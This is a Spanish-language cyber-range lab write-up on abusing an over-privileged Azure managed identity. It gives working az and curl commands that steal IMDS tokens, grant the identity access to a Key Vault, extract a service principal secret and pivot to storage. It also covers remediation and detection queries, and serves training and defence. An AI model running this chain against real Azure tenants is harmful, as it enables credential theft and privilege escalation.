# AP02 — Managed Identity sobre-privilegiada → secreto en Key Vault → lateral

- **Capa:** Azure (Managed Identity · Key Vault · Storage)
- **Coste:** bajo — VM `Standard_B1s` (~7,6 USD/mes) + IP pública estándar (~3,65 USD/mes) + Key Vault/Storage en céntimos; por sesión con `caelum.ps1 destroy`: ~0,05–0,20 USD. Único AP del esqueleto que factura cómputo → exige disciplina de teardown.
- **MITRE ATT&CK:** [T1552.005](https://attack.mitre.org/techniques/T1552/005/) (Unsecured Credentials: Cloud Instance Metadata API) · [T1078.004](https://attack.mitre.org/techniques/T1078/004/) (Valid Accounts: Cloud Accounts) · [T1580](https://attack.mitre.org/techniques/T1580/) (Cloud Infrastructure Discovery) · [T1098](https://attack.mitre.org/techniques/T1098/) (Account Manipulation)
- **Mapea a cert:** CARTP / CARTE
- **Precondición sembrada por el range:**
  - VM Linux `caelum-ap02-web` (Ubuntu 22.04 LTS) con **system-assigned managed identity** y acceso inicial representado por una credencial de laboratorio (admin + `random_password`, SSH/22 abierto en el NSG) — simula un RCE/webshell previo.
  - La MI de la VM tiene **`Contributor` sobre todo el resource group `caelum-ap02-rg`** (exceso de privilegio deliberado).
  - Key Vault `caelum-ap02-kv-<rand>` en modelo **access-policy** (legacy), `purge_protection_enabled = false`, `soft_delete_retention_days = 7`, que custodia el secreto `automation-sp-secret` = *client secret* del service principal `caelum-ap02-automation`.
  - SP `caelum-ap02-automation` con **`Storage Blob Data Contributor`** sobre el storage `caelumap02data<rand>`, cuyo contenedor `loot` guarda el blob botín `flag.txt`.
  - Todo cableado por Terraform (`enable_ap02 = true`), 100% declarativo — sin seed de post-despliegue.

---

## 🎯 Objetivo didáctico

Que el alumno interiorice que **una managed identity no es una caja fuerte: es un token de portador atado al host**, y que el verdadero fallo no es el robo del token (inevitable con RCE sobre la VM) sino **el alcance que ese token hereda**. El escenario demuestra la cadena canónica de CARTP/CARTE: `VM → MI sobre-privilegiada → self-grant sobre Key Vault → robo de credencial de SP → identidad reutilizable de mayor alcance → datos`. El eje conceptual es que `Contributor` incluye `Microsoft.KeyVault/vaults/accessPolicies/write`, de modo que en un vault en **access-policy** la propia MI puede reescribir su autorización de datos y auto-concederse lectura de secretos — un pivote que no debería existir y que **desaparece al migrar el vault a RBAC**.

---

## 🔴 Rompe (cómo se explota)

Nivel entrenamiento. Herramientas públicas de referencia: **az cli**, **MicroBurst** (`Get-AzPasswords`), **ROADtools**, **pacu**.

1. **Acceso inicial al host** (sembrado por el range — representa un RCE/webshell previo). SSH a `caelum-ap02-web` con la credencial de laboratorio declarada en Terraform (puerto 22 abierto en el NSG):
   ```bash
   ssh <admin_username>@<ap02_vm_public_ip>
   ```

2. **Reconocimiento de la MI.** Confirmar que el IMDS es alcanzable y que la VM tiene identidad asignada:
   ```bash
   curl -s -H 'Metadata: true' \
     'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | jq .compute
   # Atajo (system-assigned, no hace falta client_id):
   az login --identity
   ```

3. **Robo del token de la MI (T1552.005).** El plano de autenticación de la VM es el **IMDS en `169.254.169.254`** (que *es* la Cloud Instance Metadata API). Se piden dos tokens con la cabecera `Metadata: true`, variando el parámetro `resource` según el plano objetivo:
   ```bash
   # Token para ARM (enumerar y, después, el set-policy):
   curl -s -H 'Metadata: true' \
     'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'

   # Token para el plano de datos de Key Vault:
   curl -s -H 'Metadata: true' \
     'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net'
   ```
   > **Caveat didáctico — VM (IMDS) vs serverless (IDENTITY_ENDPOINT).** En una VM el token se obtiene del IMDS (`169.254.169.254`). En App Service / Azure Functions **no hay IMDS**: la MI se consume vía las variables `IDENTITY_ENDPOINT` + `IDENTITY_HEADER` (`curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01" -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"`). Por eso este AP mapea limpiamente a T1552.005 (metadata API), mientras que el caso serverless encaja más en T1528 puro.
   > **Caveat defensivo.** La llamada al IMDS **no genera telemetría propia en Azure**: no hay log del `GET` al token endpoint. La detección se apoya en eventos *aguas abajo* (AuditEvent del vault, AzureActivity del set-policy / role assignment) — ver sección 🔵 Detecta.

4. **Enumeración con la identidad de la MI (T1580 / T1078.004).** Con el token ARM, inventariar el RG y descubrir el vault y el storage:
   ```bash
   az resource list -g caelum-ap02-rg -o table
   # → Key Vault caelum-ap02-kv-<rand> y storage caelumap02data<rand>
   ```

5. **Self-grant / abuso del exceso de privilegio (T1098).** La MI es `Contributor` sobre el RG y el vault está en **access-policy** sin permiso de datos para la MI. `Contributor` incluye `...accessPolicies/write`, así que la MI reescribe la propia access policy para concederse lectura de secretos (técnica clásica CARTP):
   ```bash
   az keyvault set-policy --name caelum-ap02-kv-<rand> \
     --object-id <mi-principalId> \
     --secret-permissions get list
   ```

6. **Exfiltración del secreto (T1552.005).** Leer el *client secret* del SP:
   ```bash
   az keyvault secret show --vault-name caelum-ap02-kv-<rand> \
     --name automation-sp-secret --query value -o tsv
   # Equivalente REST (plano de datos, con el token de vault.azure.net):
   # GET https://caelum-ap02-kv-<rand>.vault.azure.net/secrets/automation-sp-secret?api-version=7.4
   #      Authorization: Bearer <token-vault>
   ```

7. **Movimiento lateral a una segunda identidad (T1078.004).** El secreto no da datos directamente: da una **identidad distinta y de mayor alcance**. Se inicia sesión como el SP `caelum-ap02-automation` — el salto de "token efímero atado al host" a "credencial de cuenta cloud reutilizable":
   ```bash
   az login --service-principal -u <appId caelum-ap02-automation> \
     -p <secret> --tenant <tenantId>
   ```

8. **Trofeo.** El SP tiene `Storage Blob Data Contributor` sobre `caelumap02data<rand>`. Descargar el botín demuestra el cruce de fronteras de confianza `VM → MI → Key Vault → SP → datos`:
   ```bash
   # Sin --file, az vuelca el contenido del blob a stdout (az >= 2.40):
   az storage blob download --account-name caelumap02data<rand> \
     --container-name loot --name flag.txt --auth-mode login
   ```

---

## 🟢 Arregla (remediación)

1. **Menor privilegio en la MI.** Sustituir el `Contributor` sobre el RG por el permiso mínimo sobre **el único secreto** que el host necesita. La MI nunca debe poder reescribir su propia autorización:
   ```powershell
   # Quitar el role assignment excesivo:
   Remove-AzRoleAssignment -ObjectId <mi-principalId> `
     -RoleDefinitionName "Contributor" `
     -Scope "/subscriptions/<sub>/resourceGroups/caelum-ap02-rg"

   # Conceder solo lectura de secretos (modelo RBAC, acotado al vault):
   New-AzRoleAssignment -ObjectId <mi-principalId> `
     -RoleDefinitionName "Key Vault Secrets User" `
     -Scope "/subscriptions/<sub>/resourceGroups/caelum-ap02-rg/providers/Microsoft.KeyVault/vaults/caelum-ap02-kv-<rand>"
   ```

2. **Migrar el Key Vault de access-policy a RBAC** (`enable_rbac_authorization = true`). En RBAC, `Contributor` por sí solo **no** otorga acceso al plano de datos **ni** permite auto-asignarse roles de datos (requiere `User Access Administrator` u `Owner`). Esto elimina el self-grant que hace explotable la ruta:
   ```powershell
   Update-AzKeyVault -VaultName caelum-ap02-kv-<rand> `
     -ResourceGroupName caelum-ap02-rg -EnableRbacAuthorization $true
   ```

3. **No guardar secretos de larga vida (client secrets de SP) en Key Vault.** Preferir managed identities / workload identity federation. Si el secreto debe existir: rotación corta y acceso de datos acotado por RBAC.

4. **Segmentación / blast radius.** El web host de bajo valor no debe compartir RG ni scope con el Key Vault que custodia credenciales de automatización — separar por RG/subscription.

5. **Telemetría.** Habilitar diagnostic settings del Key Vault (categoría `AuditEvent` → Log Analytics) y recolectar `AzureActivity`; alertar sobre el `set-policy` (`VaultPatch` / `Microsoft.KeyVault/vaults/accessPolicies/write`) y `Microsoft.Authorization/roleAssignments/write`:
   ```powershell
   $log = New-AzDiagnosticSettingLogSettingsObject -Category AuditEvent -Enabled $true
   New-AzDiagnosticSetting -ResourceId <kv-resourceId> -Name kv-audit-to-law `
     -WorkspaceId <law-id> -Log $log
   # Equivalente az CLI:
   # az monitor diagnostic-settings create --name kv-audit-to-law \
   #   --resource <kv-resourceId> --workspace <law-id> \
   #   --logs '[{"category":"AuditEvent","enabled":true}]'
   ```

6. **Endurecer el host.** No exponer el puerto 22 a Internet: restringir el NSG a IPs de administración o usar Azure Bastion; limitar el egress y aplicar JIT.

7. **En el range:** `./caelum.ps1 reset` (equivale a `terraform apply` con `-var enable_ap02=false`) re-aplica el estado declarado y **revierte la access policy que el atacante modificó fuera de Terraform**. Alternativa manual: `az keyvault delete` + `az keyvault purge`.

> **Aviso de teardown.** Si en el ejercicio se escala manualmente a `Contributor` en scope de **subscription**, esa role assignment **no la gestiona Terraform** y hay que limpiarla a mano.

---

## 🔵 Detecta

La llamada al IMDS no deja log; los eventos delatores están **aguas abajo**, en los **Key Vault Audit Logs** (`VaultPatch` del set-policy / `SecretGet` del secreto) y en **AzureActivity** (`Microsoft.KeyVault/vaults/accessPolicies/write` del set-policy y `Microsoft.Authorization/roleAssignments/write` del grant de `Contributor`).

- KQL (Sentinel / Defender XDR): [`detections/kql/AP02-managed-identity.kql`](../../detections/kql/AP02-managed-identity.kql)
- Sigma: [`detections/sigma/AP02-managed-identity.yml`](../../detections/sigma/AP02-managed-identity.yml)

Señales de caza complementarias:
- **`OperationName == "VaultPatch"` en `AzureDiagnostics` (Key Vault AuditEvent) — o `Microsoft.KeyVault/vaults/accessPolicies/write` en `AzureActivity` — cuya identidad iniciadora es una managed identity** — una MI que reescribe la access policy del vault en el que vive es casi siempre un self-grant.
- Secuencia temporal estrecha: `set-policy` → `SecretGet` de `automation-sp-secret` por el mismo `objectId`, seguida de un `az login` de SP y accesos a `caelumap02data<rand>`.
- `Microsoft.Authorization/roleAssignments/write` que concede `Contributor` a una identidad de cómputo (anomalía de aprovisionamiento).
- Autenticación del SP `caelum-ap02-automation` desde una IP/ASN distinta a la del host o del pipeline legítimo (credencial reutilizada tras el robo).
- Acceso a blobs del contenedor `loot` con `--auth-mode login` por un SP que normalmente no toca ese storage.

---

## 📚 Referencias

- Microsoft — [Azure Instance Metadata Service (IMDS) — acquire an access token](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token)
- Microsoft — [Migrate a Key Vault from access policies to RBAC](https://learn.microsoft.com/en-us/azure/key-vault/general/rbac-migration)
- Microsoft — [Azure built-in roles: Key Vault Secrets User](https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#key-vault-secrets-user)
- Microsoft — [Monitor Key Vault with diagnostic logs](https://learn.microsoft.com/en-us/azure/key-vault/general/logging)
- MITRE ATT&CK — T1552.005, T1078.004, T1580, T1098
